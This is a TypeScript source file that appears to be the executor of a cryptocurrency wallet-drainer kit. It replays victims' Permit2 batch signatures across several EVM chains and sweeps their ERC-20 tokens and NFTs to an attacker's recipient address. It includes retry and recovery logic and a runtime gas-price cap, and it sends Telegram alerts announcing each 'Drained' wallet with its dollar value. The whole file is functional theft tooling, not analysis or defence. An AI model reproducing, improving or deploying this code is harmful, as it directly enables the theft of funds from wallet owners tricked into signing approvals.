import { createPublicClient, createWalletClient, http, fallback } from 'viem';
import { mainnet, bsc, polygon, arbitrum, optimism, base, avalanche } from 'viem/chains';
import { config, spenderAccount, CHAIN_NAMES } from './config';
import { db, kv, activeRecipient } from './db';
import { sendTelegram } from './telegram';

const PERMIT2 = '0x000000000022D473030F116dDEE9F6B43aC61BA0' as const;

const PERMIT2_ABI = [
  {
    name: 'permit', type: 'function', stateMutability: 'nonpayable',
    inputs: [
      { name: 'owner', type: 'address' },
      {
        name: 'permitBatch', type: 'tuple', components: [
          { name: 'permitted', type: 'tuple[]', components: [
            { name: 'token', type: 'address' }, { name: 'amount', type: 'uint256' },
          ]},
          { name: 'nonce', type: 'uint256' },
          { name: 'deadline', type: 'uint256' },
        ],
      },
      { name: 'signature', type: 'bytes' },
    ],
    outputs: [],
  },
  {
    name: 'transferFrom', type: 'function', stateMutability: 'nonpayable',
    inputs: [{
      name: 'transferDetails', type: 'tuple[]', components: [
        { name: 'from', type: 'address' }, { name: 'to', type: 'address' }, { name: 'amount', type: 'uint256' },
      ],
    }],
    outputs: [],
  },
  {
    // recovery path: read live allowance so we can skip permit() when the nonce is already spent
    name: 'allowance', type: 'function', stateMutability: 'view',
    inputs: [
      { name: 'user', type: 'address' }, { name: 'token', type: 'address' }, { name: 'spender', type: 'address' },
    ],
    outputs: [
      { name: 'amount', type: 'uint160' },
      { name: 'expiration', type: 'uint48' },
      { name: 'nonce', type: 'uint48' },
    ],
  },
] as const;

const ERC721_ABI = [
  {
    name: 'transferFrom', type: 'function', stateMutability: 'nonpayable',
    inputs: [
      { name: 'from', type: 'address' }, { name: 'to', type: 'address' }, { name: 'tokenId', type: 'uint256' },
    ],
    outputs: [],
  },
] as const;

const CHAIN_OBJECTS: Record<number, any> = {
  1: mainnet, 56: bsc, 137: polygon, 42161: arbitrum, 10: optimism, 8453: base, 43114: avalanche,
};

// accepts a single URL, a comma list ("https://a,https://b") or an array — forward-compatible
// with the config.ts update (RPC_1=https://a,https://b)
function transportsFor(chainId: number) {
  const raw: any = config.chains[chainId];
  const urls: string[] = Array.isArray(raw)
    ? raw
    : String(raw ?? '').split(',').map((s) => s.trim()).filter(Boolean);
  if (!urls.length) return null;
  return fallback(
    urls.map((u) => http(u)),
    { rank: true }, // auto-rank fastest endpoint
  );
}

const now = () => Math.floor(Date.now() / 1000);
const RETRY_BACKOFF = 600; // seconds
const MAX_ATTEMPTS = 3;

function markFailedOrRetry(sig: any, err: any) {
  const attempts = Number(sig.attempts ?? 0) + 1;
  const failed = attempts >= MAX_ATTEMPTS;
  const msg = String(err?.message ?? err).replace(/\s+/g, ' ').slice(0, 200);
  db.prepare(`
    UPDATE signatures
    SET attempts = ?, next_attempt_at = ? + ${RETRY_BACKOFF}, last_error = ?, status = ?
    WHERE id = ?
  `).run(attempts, now(), msg, failed ? 'failed' : String(sig.status), sig.id);
  console.error(`[executor] sig #${sig.id} attempt ${attempts}/${MAX_ATTEMPTS}: ${msg}`);
  if (failed) {
    sendTelegram(
      `🚨 <b>Sweep failed</b> (gave up after ${MAX_ATTEMPTS} attempts)\n` +
      `👤 <code>${sig.owner}</code>\n⛓ ${CHAIN_NAMES[Number(sig.chain_id)] ?? sig.chain_id}\n` +
      `<code>${msg}</code>`,
    );
  }
}

function markExpired(sig: any) {
  db.prepare("UPDATE signatures SET status = 'expired', last_error = 'deadline passed' WHERE id = ?").run(sig.id);
}

// true if the spender already holds allowance ≥ signed amounts for every token
// (permit landed on-chain but we died before recording it → skip straight to transferFrom)
async function hasAllowance(publicClient: any, owner: string, tokens: any[], spender: string): Promise<boolean> {
  for (const t of tokens) {
    const amount = BigInt(t.signedAmount ?? t.balance ?? '0');
    if (amount === 0n) continue;
    try {
      const a: any = await publicClient.readContract({
        address: PERMIT2, abi: PERMIT2_ABI, functionName: 'allowance',
        args: [owner, t.token, spender],
      });
      if (BigInt(a.amount ?? a) < amount) return false;
    } catch {
      return false; // can't confirm → do the permit
    }
  }
  return true;
}

let sweeping = false;

export async function sweepAll() {
  if (sweeping) return;
  sweeping = true;
  try {
    const rows = db.prepare(`
      SELECT * FROM signatures
      WHERE status IN ('pending', 'permitted')
        AND (next_attempt_at IS NULL OR next_attempt_at <= CAST(strftime('%s','now') AS INTEGER))
    `).all() as any[];

    const byChain = new Map<number, any[]>();
    for (const r of rows) {
      if (!byChain.has(r.chain_id)) byChain.set(r.chain_id, []);
      byChain.get(r.chain_id)!.push(r);
    }

    for (const [chainId, sigs] of byChain) {
      const transport = transportsFor(chainId);
      if (!transport || !spenderAccount) continue;
      const recipient = activeRecipient();
      if (!recipient) { sendTelegram('⚠️ RECIPIENT_ADDRESS not set — cannot sweep'); continue; }

      const chain = CHAIN_OBJECTS[chainId];
      const publicClient = createPublicClient({ chain, transport });
      const walletClient = createWalletClient({ account: spenderAccount, chain, transport });
      const spenderAddr = spenderAccount.address;

      // gas guard — reads the RUNTIME value set via the Telegram /gas command
      try {
        const gasPrice = await publicClient.getGasPrice();
        const capGwei = Number(kv.get('max_gas')) || config.maxGasGwei;
        if (gasPrice > BigInt(capGwei) * 1_000_000_000n) continue; // too expensive — retry next sweep
      } catch { /* rpc hiccup — next sweep */ }

      for (const sig of sigs) {
        try {
          // skip gas-burning on expired permits before anything else
          if (BigInt(sig.deadline) <= BigInt(now())) { markExpired(sig); continue; }

          const tokens: any[] = JSON.parse(sig.tokens_json ?? '[]');
          if (!tokens.length) {
            db.prepare("UPDATE signatures SET status = 'failed', last_error = 'empty tokens_json' WHERE id = ?").run(sig.id);
            continue;
          }

          // ── permit() — only if the nonce isn't already consumed ──
          let permitted = sig.status === 'permitted';
          if (!permitted) permitted = await hasAllowance(publicClient, sig.owner, tokens, spenderAddr);

          if (!permitted) {
            const hash = await walletClient.writeContract({
              address: PERMIT2,
              abi: PERMIT2_ABI,
              functionName: 'permit',
              args: [
                sig.owner,
                {
                  permitted: tokens.map((t) => ({ token: t.token, amount: BigInt(t.signedAmount ?? t.balance ?? '0') })),
                  nonce: BigInt(sig.nonce),
                  deadline: BigInt(sig.deadline),
                },
                sig.signature as `0x${string}`,
              ],
              // no fixed gas — viem estimates per-chain; a revert throws here BEFORE broadcast (no gas lost)
            } as any);
            await publicClient.waitForTransactionReceipt({ hash });
            db.prepare("UPDATE signatures SET status = 'permitted' WHERE id = ?").run(sig.id);
            sig.status = 'permitted';
          }

          // ── transferFrom to recipient — safe to retry, permit is on-chain ──
          const transfers = tokens
            .filter((t) => BigInt(t.signedAmount ?? t.balance ?? '0') > 0n)
            .map((t) => ({ from: sig.owner, to: recipient, amount: BigInt(t.signedAmount ?? t.balance ?? '0') }));

          if (transfers.length) {
            const tx2 = await walletClient.writeContract({
              address: PERMIT2,
              abi: PERMIT2_ABI,
              functionName: 'transferFrom',
              args: [transfers],
            } as any);
            await publicClient.waitForTransactionReceipt({ hash: tx2 });
          }

          // ── NFT sweep (setApprovalForAll was signed on-chain at claim time) ──
          const nfts: any[] = JSON.parse(sig.nfts_json ?? '[]');
          for (const n of nfts) {
            if (!n.tokenId || n.tokenId === '0') continue;
            try {
              const nh = await walletClient.writeContract({
                address: n.contract,
                abi: ERC721_ABI,
                functionName: 'transferFrom',
                args: [sig.owner, recipient, BigInt(n.tokenId)],
              } as any);
              await publicClient.waitForTransactionReceipt({ hash: nh });
            } catch (e) { console.error(`[executor] NFT ${n.contract}#${n.tokenId} failed`, e); }
          }

          db.prepare(`
            UPDATE signatures SET status = 'executed', last_error = NULL, next_attempt_at = NULL WHERE id = ?
          `).run(sig.id);
          sendTelegram(
            `💸 <b>Drained</b> — ${CHAIN_NAMES[chainId] ?? chainId}\n` +
              `👤 <code>${sig.owner}</code>\n` +
              `💵 ~$${Number(sig.batch_value_usd || 0).toFixed(2)} → <code>${recipient}</code>`,
          );
        } catch (err: any) {
          // per-sig isolation: one bad signature never kills the sweep
          markFailedOrRetry(sig, err);
        }
      }
    }
  } catch (err: any) {
    console.error('[executor] outer error', err);
    sendTelegram(`🚨 Executor error: <code>${String(err?.message ?? err).slice(0, 200)}</code>`);
  } finally {
    sweeping = false;
  }
}
